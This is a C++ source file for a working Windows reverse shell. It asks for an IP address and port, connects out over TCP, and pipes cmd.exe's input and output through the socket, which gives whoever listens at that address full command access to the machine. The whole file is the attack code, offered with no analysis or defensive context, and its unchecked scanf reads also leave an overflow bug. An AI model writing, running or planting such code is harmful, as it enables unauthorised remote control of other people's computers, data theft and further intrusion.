#include <iostream>
#include <winsock2.h>
#include <stdio.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")

int main()
{
    SOCKET shell;
    sockaddr_in shell_addr;
    WSADATA wsa;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    int connection;
    char ip_addr[16], port_str[6], RecvServer[512];

    // Prompt user to enter IP address and port number
    printf("Enter IP address: ");
    scanf("%s", ip_addr);
    printf("Enter port number: ");
    scanf("%s", port_str);
    int port = atoi(port_str);

    WSAStartup(MAKEWORD(2, 2), &wsa); //initializing winsock
    shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL); //creates a TCP socket

    shell_addr.sin_port = htons(port);
    shell_addr.sin_family = AF_INET;
    shell_addr.sin_addr.s_addr = inet_addr(ip_addr);

    connection = WSAConnect(shell, (SOCKADDR*)&shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL); //connect to server
    if(connection == SOCKET_ERROR)
    {
        printf("(!) Connection to the target server failed\n");
        exit(0);
    }

    else
    {
        recv(shell, RecvServer, sizeof(RecvServer), 0);
        memset(&si, 0, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE) shell; //pipes stdin, stdout and stderr to socket
        CreateProcess(NULL, "cmd.exe", NULL, NULL, true, 0, NULL, NULL,&si, &pi); //spawns cmd window
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        memset(RecvServer, 0, sizeof(RecvServer));
    }
}
